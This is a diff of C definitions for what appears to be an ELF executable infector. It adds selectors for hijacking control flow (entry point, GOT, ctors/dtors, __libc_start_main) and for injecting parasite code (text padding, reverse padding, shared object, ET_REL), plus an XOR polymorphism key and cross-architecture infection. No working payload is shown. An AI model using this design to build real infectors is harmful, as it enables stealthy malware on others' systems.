@@ -16,6 +16,19 @@
 #define HIJACK_FINI 2
 #define HIJACK_MAIN 3
 
+#define ENTRY_REDIR     1
+#define GOT_REDIR       2
+#define CTORS_REDIR     3
+#define DTORS_REDIR     4
+#define ARBFUNC_REDIR   5 
+#define STARTMAIN_REDIR 6
+
+#define TEXT_INJECT    1
+#define REVERSE_INJECT 2
+#define DATA_INJECT    3
+#define SO_INJECT      4
+#define ETREL_INJECT   5
+
 typedef struct {
     char *name;
     unsigned char *mem;
@@ -27,36 +40,42 @@ typedef struct {
     char host[MAX_FILENAME];
     /* name of parasite file */
     char parasite[MAX_FILENAME];
+
+    /* PARASITE OPTIONS */
+
     /* XOR key for polymorphism */
     char polymorphic_key;
     /* address to patch parasite code with */
     unsigned long patch_addr;
     /* patch position */
     unsigned int patch_pos;
-    /* entrypoint redirect */
+
+    /* REDIRECTION OPTIONS */
+
+    unsigned int redirection_method;
+
+    /*
     unsigned int entrypoint;
-    /* got table redirect */
     unsigned int gottable; 
-    char pltsymbol[MAX_FILENAME];
-    /* ctors redirect */
     unsigned int ctors; 
-    /* dtors redirect */
     unsigned int dtors; 
-    /* arbitrary function hook */
     unsigned int arbfunc; 
-    /* __libc_start_main arg hijacking*/
     unsigned int startmain;
+    */
+    
+    char pltsymbol[MAX_FILENAME];
     unsigned int startmain_mode;
 
+    /* INJECTION METHOD */
 
-    /* text padding method */
+    unsigned int injection_method;
+
+    /*
     unsigned int textpadding; 
-    /* reverse padding method */
     unsigned int reversepadding; 
-    /* shared object method */
     unsigned int soinject; 
-    /* et_rel method */
     unsigned int etrelinject; 
+    */
 
     /* cross architecture infection */
     unsigned int cross_infect;
